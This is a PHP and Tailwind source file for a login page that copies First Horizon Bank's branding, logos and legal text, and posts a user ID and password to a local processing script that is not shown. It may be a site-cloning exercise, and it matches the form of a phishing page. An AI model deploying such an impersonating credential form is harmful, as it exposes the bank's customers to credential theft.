<?php
   session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Personal | First Horizon Bank</title>
    <link rel="shortcut icon" href="./img/favicon.png" type="image/x-icon">
    <link href="./output.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
   crossorigin="anonymous"
   referrerpolicy="no-referrer">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/remixicon@3.4.0/fonts/remixicon.css">
   
</head>
<body>
    <div> <!--main container-->
    <header class="pb-4">
            <!--top bar-->
            <div class="topbar hidden gap-5 py-2 px-4 flex-row md:flex h-10 bg-gray-100 justify-between" id="topbar">
               <a href="#" class="left-0"><i class="ri-phone-fill text-blue-700"></i>  800-345-128</a>
               <div class="ml-auto gap-3 flex">
                <a href="./about.html" class="uppercase ">About Us</a>
                <a href="#" class="uppercase">Locations</a>
             
               </div>
                
               
               
            </div>

            <nav class="relative w-full bg-white" >
                <!--flex container-->
                <div class="flex justify-between px-6 pt-4 mx-auto">
                    <!--Hamburger Menu-->
                    <button id="menu-btn" class="block hamburger w-12 mt-3 md:hidden focus:outline-none">
                        <span class="hamburger-top"></span>
                        <span class="hamburger-middle"></span>
                        <span class="hamburger-bottom"></span>
                    </button>
                    <!--menu items-->
                    <div class="hidden md:flex space-x-6 w-1/3">
                        <a href="personal.html" class="hover:text-red-500">Personal Banking</a>
                        <a href="small-business.html" class="hover:text-red-500">Small Business</a>
                        <a href="corporate.html" class="hover:text-red-500">Commercial & Specialty</a>
                        <a href="wealth-management.html" class="hover:text-red-500">Wealth Management</a>
                        
    
                    </div>
                    <!--logo-->
                    <div class="pt-2 w-1/3 items-center justify-center">
                        <a href="./index.html">
                        <img src="./img/logos/FH_OneLine.png" alt="Logo">
                       </a>
                    </div>
                    <!--button and-->
                    <div>
                        <a href="login.php" class="bg-white hover:text-red-500 text-blue-800 border-1 border-blue-500 ml-auto md:block p-3 px-6 pt-2 md:text-white md:bg-blue-700 baseline md:hover:bg-blue-900"><i class="ri-git-repository-private-fill"></i>Log In</a>
                
                    </div>

                    
                    
                    
                </div>
    
                <!--Mobile menu-->
                <div class="md:hidden">
                    <div id="menu" class="hidden absolute flex-col items-center self-end py-8 mt-10 space-y-6 font-bold bg-white sm:w-auto
                    sm:self-center left-6 right-6 drop-shadow-md">
                    <a href="personal.html" class="hover:text-red-500">Personal Banking</a>
                        <a href="small-business.html" class="hover:text-red-500">Small Business</a>
                        <a href="corporate.html" class="hover:text-red-500">Commercial & Specialty</a>
                        <a href="wealth-management.html" class="hover:text-red-500">Wealth Management</a>
                    
                    </div>
                </div>
            </nav>
        </header>
        
        
        <!--hero section-->
        <section id="loginhero" class="md:py-48">
            <!--f;ex container-->
            
                
                <div class="flex flex-col mb-16 md:w-1/2 w-full opacity-7 py-10 px-5 gap-6 mx-auto justify-between items-center bg-white">
                   <!--image -->
                   <div>
                      <img src="./img/logos/FHBstacked.svg" alt="">
                   </div>
                   <h3 class="text-center md:text-3xl text-2xl">
                   Log in to our banking and investment services
                   </h3>
                    <!--form div -->
                   <div class="w-full">
                   <?php 
                               if(isset($_SESSION['error'])){
                                  $msg = $_SESSION['error'];
                               
                            ?>
                            <span class="text-red-500 text-sm text-left font-medium">
                                    <?php echo $msg ?>
                            </span>
                            <?php
                               }
                               unset($_SESSION['error']);
                            ?>
                       <form action="processlogin.php" class="flex flex-col gap-3 px-3" method="post">
                         <div class="flex w-full">
                         <select name="type" id="" class="border w-full rounded-md px-3 py-2 focus:outline-none focus:border-blue-500">
                                <option value="digital">Digital Banking</option>
                                <option value="emoney">eMoney</option>
                                <option value="mortgage">Mortgage</option>
                                <option value="wealthscape">Wealthscape Investor</option>
                                <option value="safekeeping">Commercial Safekeeping</option>
                                <option value="envestnet">Envestnet</option>
                                <option value="trust">Trust Services</option>
                            </select>
                         </div>
                         <div class="flex flex-col">
                            <label for="userid" class="text-blue-800 font-bold text-left text-md">User ID</label>
                            <input type="text" id="userid" name="logid" class="border px-3 py-2 focus:outline-none focus:border-blue-500">
                            
                         </div>
                         <div class="flex flex-col relative">
                            <label for="password" class="text-blue-800 font-bold text-left text-md">Password</label>
                            <input type="password" name="password" id="password" class="border px-3 py-2 pr-10 focus:outline-none focus:border-blue-500">
                            <span
    id="togglePasswordBtn" 
    class="absolute inset-y-3 right-3 px-2 py-3 bg-white focus:outline-none"
    onclick="togglePassword()"
  >
  <i class="ri-eye-off-fill"></i>
</span>

                         </div>
                         <div class="flex flex-col">
                         <button type="submit" name="login" class="bg-blue-800 hover:bg-blue-700 text-white font-bold py-2 px-4"><i class="ri-lock-line"></i>&nbsp;&nbsp;Login</button>

                          <div class="flex flex-row">
                            <a href="#" class="text-blue-900 text-md mr-auto text-left">Enroll for Access</a>
                            <a href="#" class="text-blue-900 text-md ml-auto text-right">Forgot ID or Password</a>
                          </div>  
                         

                         </div>
                            



                       </form>
                   </div>
                    
                    
                    

                </div>
               
           
        </section>
                
        
        
        
        <footer id="footer" class="bg-blue-950">
            <!--flex container-->
            <div class="flex flex-col justify-between px-12 py-10 mx-auto space-y-8 md:space-y-8">
                <!--Logo and about container-->
                <div class="flex flex-col items-center justify-between space-y-12 md:space-x-28 md:flex-row md:space-y-0 md:items-start">
                    <!--logo-->
                    <div class="mx-auto my-6 text-center">
                        <img src="./img/logos/logofhb.svg" alt="">
                    </div>
                    <div class="flex flex-col gap-3">
                        <h4 class="text-lg font-semibold uppercase text-white">About first horizon</h4>
                        <div class="flex flex-col space-y-3 text-white border-l-2 border-red-400 pl-3">
                            <a href="#" class="hover:text-red-400">About Us</a>
                            <a href="#" class="hover:text-red-400">Investor Relations</a>
                            <a href="#" class="hover:text-red-400">Careers</a>
                            <a href="#" class="hover:text-red-400">Diversity, Inclusion, Equity</a>
                        
                        </div>
                        
                    </div>
                    <div class="flex flex-col gap-3">
                        <h4 class="text-lg text-white font-semibold uppercase">products and services</h4>
                        <div class="flex flex-col space-y-3 text-white border-l-2 border-red-400 pl-3">
                            <a href="#" class="hover:text-red-400">Personal Banking</a>
                            <a href="#" class="hover:text-red-400">Small Business Banking</a>
                            <a href="#" class="hover:text-red-400">Commercial and Specialty</a>
                            <a href="#" class="hover:text-red-400">Wealth Management</a>
                        
                        </div>
                        
                    </div>
                    <div class="flex flex-col gap-3">
                        <h4 class="text-lg text-white font-semibold uppercase">Support</h4>
                        <div class="flex flex-col space-y-3 text-white border-l-2 border-red-400 pl-3">
                            <a href="#" class="hover:text-red-400">Contact Us</a>
                            <a href="#" class="hover:text-red-400">FAQs</a>
                            <a href="#" class="hover:text-red-400">Customer Service Requests</a>
                            <a href="#" class="hover:text-red-400">Learning Center</a>
                        
                        </div>
                        
                    </div>
                </div>

                
                <!--socials container-->

                <div class="flex flex-col items-center justify-between space-y-12 md:space-x-28 md:flex-row md:space-y-0 md:items-start">
                   
                    <!--logo-->
                    <div class="mx-auto my-6 text-center">
                        <img src="./img/downloadmobileapp.svg" alt="">
                    </div>
                    <div class="flex flex-1 flex-col gap-3">
                        <h4 class="text-lg font-semibold uppercase text-white">Socials</h4>
                        <div class="flex flex-row gap-2 border-l-2 border-red-400 pl-3">
                            <a href="#">
                                <img src="./img/icon-facebook.svg" alt="" class="h-8" />
                            </a>
                            <a href="#">
                                <img src="./img/icon-instagram.svg" alt="" class="h-8" />
                            </a>
                            <a href="#">
                                <img src="./img/icon-pinterest.svg" alt="" class="h-8" />
                            </a>
                            <a href="#">
                                <img src="./img/icon-twitter.svg" alt="" class="h-8" />
                            </a>
                            <a href="#">
                                <img src="./img/icon-youtube.svg" alt="" class="h-8" />
                            </a>
                        </div>
                        
                    </div>
                    <div class="flex flex-row gap-3">
                        <p class="text-white">Member FDIC. Equal Housing Lender.</p>
                        <img src="./img/memberfdic.svg" alt="">
                        
                    </div>
                   
                    
                </div>
                
                <div class="hidden w-full md:flex flex-row py-6 px-6 items-center justify-between space-x-5 gap-3 bg-gray-900 text-white uppercase">
                    
                        <a href="#" class="hover:text-red-400">fraud and security</a>
                        <a href="#" class="hover:text-red-400">Copyright claims</a>
                        <a href="#" class="hover:text-red-400">privacy policy</a>
                        <a href="#" class="hover:text-red-400">online privacy policy</a>
                        <a href="#" class="hover:text-red-400">california privscy policy</a>
                        <a href="#" class="hover:text-red-400">accessibility</a>
                    
                    
                    
                </div>
                <div class="hidden w-full md:flex flex-row py-6 px-6 items-center justify-between space-x-5 gap-3 bg-gray-900 text-white">
                    
                    <div>
                        <p class="border-l-2 border-blue-500 text-left text-sm pl-3 p-4 my-4">
                            Insurance Products, Investments & Annuities: 
                            Not A Deposit, Not Guaranteed By The Bank Or Its 
                            Affiliates, Not FDIC Insured, Not Insured By Any 
                            Federal Government Agency, May Go Down In Value
                        </p>
                        <p class="text-sm">
                            Banking Products and Services provided by First Horizon Bank. Member FDIC. Equal Housing Lender.

Insurance Products and Annuities: May be purchased from any agent or company, and the customer’s choice will not affect current or future credit decisions.

First Horizon Advisors is the trade name for wealth management products and services provided by First Horizon Bank and its affiliates. Trust services and financial planning provided by First Horizon Bank.

Investment management services, investments, annuities and financial planning available through First Horizon Advisors, Inc., member FINRA, SIPC, and a subsidiary of First Horizon Bank. Arkansas Insurance License # 416584.
                        </p>
                    </div>
                    <div>
                        <p>
                            Insurance products available through First Horizon Insurance Services, Inc. (”FHIS”), a subsidiary of First Horizon Bank. Arkansas Insurance License # 100102095.

First Horizon Advisors, Inc., FHIS, and their agents may transact insurance business or offer annuities only in states where they are licensed or where they are exempted or excluded from state insurance licensing requirements.

The contents of this website are for informational purposes only. Nothing on this website should be considered investment advice; or, a recommendation or offer to buy or sell a security or other financial product or to adopt any investment strategy.

First Horizon Advisors does not offer tax or legal advice. You should consult your personal tax and/or legal advisor concerning your individual situation.

©2024 First Horizon Bank. Member FDIC.
                        </p>
                    </div>
                
                
                
            </div>
                
            </div>

        </footer>
        

    </div>

    <script src="./js/script.js"></script>
    <script>
  function togglePassword() {
    const passwordInput = document.getElementById('password');
    const togglePasswordBtn = document.getElementById('togglePasswordBtn');

    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      togglePasswordBtn.textContent = "Hide";
    } else {
      passwordInput.type = "password";
      togglePasswordBtn.textContent = "Show";
    }
  }
</script>
    
</body>
</html>